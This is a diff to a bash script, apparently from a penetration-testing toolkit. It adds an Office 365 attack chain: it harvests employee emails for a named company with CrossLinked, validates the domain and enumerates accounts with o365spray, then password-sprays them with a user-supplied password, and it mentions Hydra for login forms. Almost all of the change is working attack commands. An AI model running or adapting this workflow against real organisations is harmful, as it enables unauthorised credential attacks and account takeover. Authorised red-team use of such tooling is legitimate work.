@@ -3,11 +3,21 @@ read -p "Please enter workspace name: " workspace
 echo $workspace
 echo "Setting email Format"
 EmailFormat=$(cat ~/workspaces/$workspace/Var/emailformat.txt)
-echo "Creating User List"
+
+read -p "Do you already have an email list? " -n 1 -r
+echo
+if [[ $REPLY =~ ^[Nn]$ ]]
+then
+	
+echo "creating email list"
 read -p "Please enter the full name of the company you would like to Enumerate: " CompName
 python3 /opt/CrossLinked/crosslinked.py -f $EmailFormat  "'$CompName'" -o ~/workspaces/$workspace/Users/emails/EmailList.txt
 echo "email list Complete"
 head -10 ~/workspaces/$workspace/Users/emails/EmailList.txt
+
+fi
+
+emaildomain=$(head -1 ~/workspaces/$workspace/Users/emails/EmailList.txt | grep -o "@.*" | sed 's/@//')
 read -p "Would you like to Continue to Validation/spray(Active/Bruteforce): " -n 1 -r
 echo    # (optional) move to a new line
 if [[ ! $REPLY =~ ^[Yy]$ ]]
@@ -16,7 +26,37 @@ then
 	    exit
 fi
 
-echo "it works"
+echo "Validating Domain"
+
+python3 /opt/o365spray/o365spray.py -d $emaildomain --validate
+
+read -p "Is the domain valid? :" -n 1 -r 
+echo 
+if [[ $reply =~ ^[Nn]$ ]]
+then
+	echo "Will require the use of Hydra to target email login form"
+	read -n 1 -r -s -p "Press any key to return to main Menu" key
+	/opt/AutoRecon/scripts/AutoEnum.sh
+	exit
+fi
+
+echo "Validating email list"
+
+python3 /opt/o365spray/o365spray.py -d $emaildomain --enum -U ~/workspaces/$workspace/Users/emails/EmailList.txt --output ~/workspaces/$workspace/Users/emails
+
+validaccountfile=$(ls ~/workspaces/$workspace/Users/emails | grep -E "enum_valid*")
+
+echo "setting up password spray" 
+read -p "Please enter a password to use: " password
+
+python3 /opt/o365spray/o365spray.py -d $emaildomain --spray -U ~/workspaces/$workspace/Users/emails/enum/$validaccountfile -p $password --output ~/workspaces/$workspace/Users/emails/spray
+
+echo "Password spray finished and saved to: $workspace/Users/emails/spray"
+echo "returning to main menu" 
+/opt/AutoRecon/AutoEnum.sh
+
+
+
 
 
 
